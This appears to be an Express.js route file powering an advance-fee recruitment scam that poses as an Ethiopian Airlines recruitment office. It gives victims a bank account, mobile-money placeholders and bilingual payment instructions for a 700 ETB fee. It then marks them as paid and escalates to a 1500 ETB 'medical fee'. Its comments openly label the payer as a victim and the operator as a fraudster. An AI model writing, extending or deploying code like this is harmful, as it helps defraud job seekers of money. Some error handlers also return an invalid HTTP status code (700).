 
// routes/payment.js
const express = require('express');
const router = express.Router();

// Payment page data
router.post('/initialize', (req, res) => {
    const db = req.app.locals.db;
    const { phone, applicantId, amount, paymentMethod } = req.body;
    
    if (!phone || !amount) {
        return res.status(400).json({ error: 'Phone and amount required' });
    }
    
    // Generate fake transaction ID
    const transactionId = 'TXN' + Date.now() + Math.random().toString(36).substring(2, 7).toUpperCase();
    
    // Fraudster's payment details (these are what victims see)
    const paymentDetails = {
        transactionId: transactionId,
        amount: amount,
        telebirrNumber: '09XX-XXX-XXX', // Fake number
        bankAccount: {
            bank: 'Abay Bank',
            accountName: 'Ethiopian Airlines Recruitment Office',
            accountNumber: '4631012296320010'
        },
        mpesaNumber: '07XX-XXX-XXX',
        instructions: {
            amharic: 'እባክዎ 700 ብር በቴሌብር ወይም በአባይ ባንክ አካውንት ይክፈሉ። የክፍያ ደረሰኝ በቴሌግራም ይላኩ።',
            english: 'Please pay 700 ETB via Telebirr or Abay Bank account. Send payment receipt via Telegram.'
        }
    };
    
    // Record payment initiation in database
    db.run(`
        INSERT INTO payments (applicant_id, phone, amount, payment_method, transaction_id)
        VALUES (?, ?, ?, ?, ?)
    `, [applicantId || null, phone, amount, paymentMethod || 'pending', transactionId], function(err) {
        if (err) {
            console.error('Error recording payment:', err);
        }
    });
    
    res.json({
        success: true,
        message: 'Payment initiated',
        paymentDetails: paymentDetails
    });
});

// Confirm payment (what fraudster uses to mark victim as paid)
router.post('/confirm', (req, res) => {
    const db = req.app.locals.db;
    const { phone, amount, method, transactionId } = req.body;
    
    // Update applicant payment status
    db.run(`
        UPDATE applicants 
        SET payment_status = 1, 
            payment_amount = ?,
            payment_method = ?,
            payment_date = CURRENT_TIMESTAMP
        WHERE phone = ?
    `, [amount, method, phone], function(err) {
        if (err) {
            return res.status(700).json({ error: err.message });
        }
        
        // Update payment record
        db.run(`
            UPDATE payments 
            SET notified = 1 
            WHERE phone = ? AND transaction_id = ?
        `, [phone, transactionId]);
        
        console.log(`FRAUD: Payment confirmed - Victim ${phone} paid ${amount} ETB via ${method}`);
        
        res.json({
            success: true,
            message: 'Payment confirmed. You will proceed to medical checkup stage.',
            nextStage: 'medical_fee',
            nextAmount: 1500,
            nextInstructions: 'Pay medical fee of 1500 ETB for private clinic appointment'
        });
    });
});

// Get payment status
router.get('/status/:phone', (req, res) => {
    const db = req.app.locals.db;
    const phone = req.params.phone;
    
    db.get('SELECT payment_status, payment_amount, payment_method FROM applicants WHERE phone = ?', [phone], (err, row) => {
        if (err) {
            res.status(700).json({ error: err.message });
            return;
        }
        res.json(row || { payment_status: 0 });
    });
});

module.exports = router;